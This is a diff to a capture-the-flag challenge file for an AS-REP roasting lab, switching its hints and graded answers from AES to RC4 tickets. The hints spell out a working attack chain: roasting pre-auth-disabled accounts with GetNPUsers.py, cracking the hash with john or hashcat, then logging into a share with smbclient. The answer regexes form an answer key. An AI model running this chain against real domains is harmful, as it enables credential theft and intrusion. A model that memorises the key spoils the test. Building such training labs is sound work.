@@ -11,7 +11,7 @@
       "dev": "FLAG{dev-asrep-lakeside}",
       "hints": [
         "The real-world technique needs no credentials, only usernames: an account with Kerberos pre-authentication disabled makes the KDC return an AS-REP to an unauthenticated request. Point your resolver and /etc/krb5.conf at the DC, then roast the list: GetNPUsers.py LAKESIDE.LAB/ -usersfile users.txt -no-pass -dc-ip <dc> -format john. Only svc-scanner is flagged DONT_REQ_PREAUTH.",
-        "This is a modern DC with RC4 disabled, so the AS-REP comes back AES (`$krb5asrep$18$...`). Crack it with John: `john --format=krb5asrep --wordlist=rockyou.txt asrep.hash`. hashcat's `-m 18200` only understands the older RC4 (`$krb5asrep$23$`) form, so it will not take this hash.",
+        "This is a Windows DC with RC4 still enabled (the default), so the AS-REP comes back RC4-HMAC: GetNPUsers emits `$krb5asrep$svc-scanner@LAKESIDE.LAB:...` (no etype number). Crack it with John as-is: `john --format=krb5asrep --wordlist=rockyou.txt asrep.hash`; or with hashcat `-m 18200`, inserting `23$` after `$krb5asrep$` so the token reads `$krb5asrep$23$svc-scanner@...`.",
         "The password is a weak word built from the scanner service's name and a year. Once cracked: smbclient //dc/imaging -U 'LAKESIDE\\svc-scanner%<cracked>' -c 'get flag.txt'."
       ],
       "steps": [
@@ -57,19 +57,18 @@
         {
           "key": "etype",
           "title": "Name the ticket encryption",
-          "prompt": "Which encryption type is this modern DC's AS-REP, the one john cracks here? (name or Kerberos etype number)",
+          "prompt": "Which encryption type is this Windows DC's AS-REP, the one you crack here? (name or Kerberos etype number)",
           "check": {
-            "answer_regex": "aes|\\b17\\b|\\b18\\b"
+            "answer_regex": "rc4|arcfour|\\b23\\b"
           }
         },
         {
           "key": "crack",
           "title": "Pick the cracking tool",
-          "prompt": "Which John the Ripper format cracks this AES AS-REP ($krb5asrep$18$) hash?",
+          "prompt": "Which John the Ripper format cracks this AS-REP ($krb5asrep$) hash?",
           "check": {
             "answer": [
               "krb5asrep",
-              "krb5asrep-aes",
               "--format=krb5asrep",
               "format=krb5asrep"
             ]
